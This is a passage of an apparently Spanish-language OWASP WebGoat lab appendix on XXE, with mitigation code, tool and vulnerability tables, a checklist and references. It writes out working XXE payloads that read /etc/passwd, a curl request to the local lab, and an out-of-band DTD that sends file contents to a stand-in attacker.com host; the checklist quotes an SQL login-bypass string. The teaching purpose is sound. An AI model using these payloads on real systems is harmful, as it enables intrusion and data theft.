+### 🔍 Cómo buscarla
+
+**Metodología**:
+
+```
+PASO 1: Identificar endpoints que aceptan XML
+  ├── APIs con Content-Type: application/xml
+  ├── SOAP endpoints
+  ├── File uploads (.xml)
+  └── Cualquier endpoint que procese XML
+
+PASO 2: Probar XXE básico
+  ├── Enviar: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  ├── Verificar si el contenido aparece en la respuesta
+  └── Si aparece → XXE confirmado
+
+PASO 3: Probar variantes
+  ├── Blind XXE (sin output en respuesta)
+  ├── Out-of-band XXE (enviar datos a servidor externo)
+  └── Parameter entities para evadir filtros
+```
+
+### 💥 Cómo explotarla
+
+**Fundamento técnico**: El parser XML procesa la DTD y resuelve las entidades externas. Si la entidad apunta a un archivo local (`file:///`) o una URL interna (`http://localhost/`), el parser lee ese recurso y lo incluye en el documento XML procesado.
+
+**Explotación paso a paso**:
+
+```bash
+# Paso 1: Ir a la lección XXE en WebGoat
+# Menú lateral → XXE
+
+# Paso 2: La lección generalmente pide que envíes XML
+# que extraiga información de un archivo
+
+# Paso 3: Enviar XXE básico para leer archivo
+# En el campo XML, ingresar:
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+# Paso 4: Si funciona, el contenido de /etc/passwd
+# aparecerá en la respuesta del servidor
+
+# Paso 5: Para blind XXE (sin output directo)
+# Usar out-of-band exfiltration:
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<comment><text>test</text></comment>
+
+# evil.dtd en el servidor del atacante:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
+%all;
+```
+
+**Con curl**:
+
+```bash
+# Paso 1: Login y obtener cookie
+# (Usar browser para login, copiar JSESSIONID)
+
+# Paso 2: Enviar XXE via POST
+curl -X POST http://localhost:8080/WebGoat/XXE/task \
+  -H "Cookie: JSESSIONID=<TU_SESSION_ID>" \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<comment><text>&xxe;</text></comment>'
+```
+
+<div class="mermaid-diagram" style="background: #1e293b; border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid #334155;">
+<div style="color: #94a3b8; font-size: 0.85em; margin-bottom: 10px; font-family: monospace;">Figura 6: XXE Attack — External Entity Resolution</div>
+<svg viewBox="0 0 600 240" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:600px;">
+<text x="300" y="20" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="bold">XXE — External Entity Resolution</text>
+<rect x="20" y="35" width="180" height="40" rx="6" fill="#ef4444"/><text x="110" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Malicious XML</text><text x="110" y="65" text-anchor="middle" fill="#fca5a5" font-size="9">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</text>
+<polygon points="200,55 230,55 225,50 230,60" fill="#94a3b8"/>
+<rect x="230" y="35" width="160" height="40" rx="6" fill="#8b5cf6"/><text x="310" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">XML Parser</text><text x="310" y="65" text-anchor="middle" fill="#c4b5fd" font-size="9">Resolves external entities</text>
+<polygon points="390,55 420,55 415,50 420,60" fill="#94a3b8"/>
+<rect x="420" y="35" width="160" height="40" rx="6" fill="#f59e0b"/><text x="500" y="50" text-anchor="middle" fill="white" font-size="11" font-weight="bold">File System</text><text x="500" y="65" text-anchor="middle" fill="#fef3c7" font-size="9">Reads /etc/passwd</text>
+<line x1="500" y1="75" x2="500" y2="95" stroke="#94a3b8" stroke-width="2"/>
+<line x1="500" y1="95" x2="310" y2="95" stroke="#94a3b8" stroke-width="2"/>
+<line x1="310" y1="95" x2="310" y2="115" stroke="#94a3b8" stroke-width="2"/>
+<rect x="230" y="120" width="160" height="35" rx="6" fill="#10b981"/><text x="310" y="135" text-anchor="middle" fill="white" font-size="11" font-weight="bold">Response</text><text x="310" y="148" text-anchor="middle" fill="#d1fae5" font-size="9">Contains file content</text>
+<rect x="20" y="170" width="560" height="45" rx="8" fill="#7f1d1d" stroke="#ef4444"/>
+<text x="300" y="190" text-anchor="middle" fill="#fca5a5" font-size="12" font-weight="bold">Vulnerable: Parser processes external entities without restriction</text>
+<text x="300" y="207" text-anchor="middle" fill="#e2e8f0" font-size="10">Fix: Disable DTD processing and external entities in parser config</text>
+<rect x="20" y="225" width="560" height="15" rx="4" fill="#1e293b" stroke="#334155"/>
+<text x="300" y="236" text-anchor="middle" fill="#94a3b8" font-size="8">Java: setFeature(disallow-doctype-decl, true) | setFeature(external-general-entities, false)</text>
+</svg>
+</div>
+
+### 🛡️ Cómo mitigarla
+
+**Remediación técnica específica**:
+
+```java
+// ✅ SEGURO — Parser XML con protección XXE completa
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+
+// 1. Desactivar DTDs completamente (mejor protección)
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+// 2. Si necesitas DTDs, desactivar entidades externas
+factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+
+// 3. No expandir referencias a entidades
+factory.setExpandEntityReferences(false);
+
+// 4. No cargar gramáticas externas
+factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
+
+// ✅ MEJOR — Usar JSON en lugar de XML
+// JSON no tiene el concepto de entidades externas
+// Si no necesitas XML, usa JSON para evitar XXE completamente
+```
+
+**Capas de defensa**:
+
+| Capa | Técnica | Efectividad |
+|------|---------|-------------|
+| **Primaria** | Desactivar DTDs (`disallow-doctype-decl`) | ~100% |
+| **Secundaria** | Desactivar entidades externas | Alta |
+| **Terciaria** | FEATURE_SECURE_PROCESSING | Alta |
+| **Alternative** | Usar JSON en lugar de XML | Muy alta |
+| **WAF** | Reglas de detección XXE | Media |
+
+---
+
+## Resumen de Herramientas Utilizadas
+
+| Herramienta | Uso en este Laboratorio | Alternativa |
+|-------------|------------------------|-------------|
+| **Docker** | Desplegar WebGoat + WebWolf | Manual Java deployment |
+| **curl** | Peticiones HTTP manuales | Postman, HTTPie |
+| **Burp Suite** | Interceptación y modificación de requests | OWASP ZAP, mitmproxy |
+| **Python 3** | Scripts de automatización | Bash, Node.js |
+| **jwt_tool** | JWT token manipulation | jwt.io, manual |
+| **ysoserial** | Deserialization payloads | manual gadget crafting |
+| **Firefox DevTools** | Inspeccionar DOM, consola, network | Chrome DevTools |
+
+---
+
+## Mapeo de Vulnerabilidades
+
+| # | Vulnerabilidad | OWASP Top 10 | CWE | MITRE ATT&CK | Dificultad |
+|---|---------------|--------------|-----|--------------|------------|
+| 1 | SQL Injection | A03:2021 | CWE-89 | T1190 | ⭐⭐ |
+| 2 | XSS (Reflected/Stored) | A07:2021 | CWE-79 | T1059.007 | ⭐⭐ |
+| 3 | Insecure Deserialization | A08:2021 | CWE-502 | T1190 | ⭐⭐⭐⭐ |
+| 4 | SSRF | A10:2021 | CWE-918 | T1190 | ⭐⭐⭐ |
+| 5 | JWT Attacks | A02:2021 | CWE-347 | T1550.001 | ⭐⭐⭐ |
+| 6 | Path Traversal | A01:2021 | CWE-22 | T1083 | ⭐⭐ |
+| 7 | XXE | A05:2021 | CWE-611 | T1190 | ⭐⭐⭐ |
+
+---
+
+## Checklist de Completitud
+
+Marca cada lección completada en WebGoat:
+
+```
+LABORATORIO WEBGOAT — CHECKLIST
+================================
+
+[ ] 1. SQL Injection (Lesson: SQL Injection)
+    ├── Login bypass (' OR '1'='1) ejecutado
+    ├── UNION SELECT para extraer datos
+    ├── Número de columnas determinado
+    └── Fundamento técnico documentado
+
+[ ] 2. XSS (Lesson: Cross-Site Scripting)
+    ├── Reflected XSS confirmado
+    ├── Stored XSS confirmado
+    ├── Payload enviado a WebWolf
+    └── Fundamento técnico documentado
+
+[ ] 3. Insecure Deserialization (Lesson: Insecure Deserialization)
+    ├── Objeto serializado analizado
+    ├── Token modificado exitosamente
+    ├── Gadget chain entendido
+    └── Fundamento técnico documentado
+
+[ ] 4. SSRF (Lesson: SSRF)
+    ├── Petición a recurso interno exitosa
+    ├── WebWolf usado como callback server
+    ├── Impacto de SSRF entendido
+    └── Fundamento técnico documentado
+
+[ ] 5. JWT Attacks (Lesson: JWT Tokens)
+    ├── Token decodificado y analizado
+    ├── alg:none attack ejecutado
+    ├── Claims manipulados exitosamente
+    └── Fundamento técnico documentado
+
+[ ] 6. Path Traversal (Lesson: Path Traversal)
+    ├── Traversal ../ confirmado
+    ├── Archivo fuera del directorio accedido
+    ├── Codificación URL probada
+    └── Fundamento técnico documentado
+
+[ ] 7. XXE (Lesson: XXE)
+    ├── Entidad externa inyectada
+    ├── Archivo local leído via XXE
+    ├── Blind XXE entendido
+    └── Fundamento técnico documentado
+
+================================
+COMPLETADO: __/7 lecciones
+PROGRESO WEBGOAT: ____%
+================================
+```
+
+---
+
+## Referencias Bibliográficas
+
+### OWASP
+
+- OWASP Top 10:2021. <https://owasp.org/Top10/>
+- OWASP WebGoat. <https://owasp.org/www-project-webgoat/>
+- OWASP WebWolf. <https://owasp.org/www-project-webgoat/>
+- OWASP Testing Guide v4. <https://owasp.org/www-project-web-security-testing-guide/>
+- OWASP Cheat Sheet Series. <https://cheatsheetseries.owasp.org/>
+
+### CWE (Common Weakness Enumeration)
+
+- CWE-89: SQL Injection. <https://cwe.mitre.org/data/definitions/89.html>
+- CWE-79: XSS. <https://cwe.mitre.org/data/definitions/79.html>
+- CWE-502: Deserialization of Untrusted Data. <https://cwe.mitre.org/data/definitions/502.html>
+- CWE-918: SSRF. <https://cwe.mitre.org/data/definitions/918.html>
+- CWE-347: Insufficient Verification of Data Authenticity. <https://cwe.mitre.org/data/definitions/347.html>
+- CWE-22: Path Traversal. <https://cwe.mitre.org/data/definitions/22.html>
+- CWE-611: XXE. <https://cwe.mitre.org/data/definitions/611.html>
+
+### MITRE ATT&CK
+
+- T1190: Exploit Public-Facing Application. <https://attack.mitre.org/techniques/T1190/>
+- T1059.007: JavaScript. <https://attack.mitre.org/techniques/T1059/007/>
+- T1550.001: Alternate Authentication Material. <https://attack.mitre.org/techniques/T1550/001/>
+- T1083: File and Directory Discovery. <https://attack.mitre.org/techniques/T1083/>
+
+### JWT
+
+- RFC 7519: JSON Web Token. <https://datatracker.ietf.org/doc/html/rfc7519>
+- jwt.io Debugger. <https://jwt.io/>
+- jwt_tool. <https://github.com/ticarpi/jwt_tool>
+
+### Herramientas
+
+- Burp Suite. <https://portswigger.net/burp>
+- OWASP ZAP. <https://www.zaproxy.org/>
+- ysoserial. <https://github.com/frohoff/ysoserial>
+- SecLists (wordlists). <https://github.com/danielmiessler/SecLists>
+
+---
+
+## Glosario Rápido
+
+| Término | Definición |
+|---------|-----------|
+| **Gadget Chain** | Secuencia de clases Java que, al deserializarse, ejecutan código arbitrario |
+| **WebWolf** | Servidor complementario de WebGoat que simula infraestructura del atacante |
+| **ObjectInputFilter** | Mecanismo de Java 9+ para restringir qué clases se pueden deserializar |
+| **SSRF** | Server-Side Request Forgery — hacer que el servidor haga peticiones a URLs del atacante |
+| **XXE** | XML External Entity — inyectar entidades externas en XML para leer archivos o hacer SSRF |
+| **PreparedStatement** | Query SQL precompilada con placeholders que separa datos de código |
+| **th:text vs th:utext** | En Thymeleaf: th:text escapa HTML, th:utext renderiza HTML sin escapar |
+| **Base64Url** | Variante de Base64 que usa `-` y `_` en lugar de `+` y `/`, sin padding `=` |
+| **CSP** | Content Security Policy — header que restringe qué recursos puede cargar el browser |
+
+---
+
+*Apéndice: OWASP WebGoat — Laboratorio de Explotación Web*
+*Fundamentos de Ciberseguridad — Diego Saavedra*
+*Duración: 8-10 horas | Nivel: Intermedio-Avanzado*
+*License: CC BY-NC-SA 4.0*
+
+::: {.callout-warning}
+## RECORDATORIO FINAL
+
+Todo lo aprendido en este laboratorio debe usarse **exclusivamente** en entornos autorizados. La explotación de vulnerabilidades en sistemas sin permiso es **ilegal** en la mayoría de jurisdicciones. Si encuentras vulnerabilidades en sistemas reales, sigue el proceso de **disclosure responsable**.
+:::
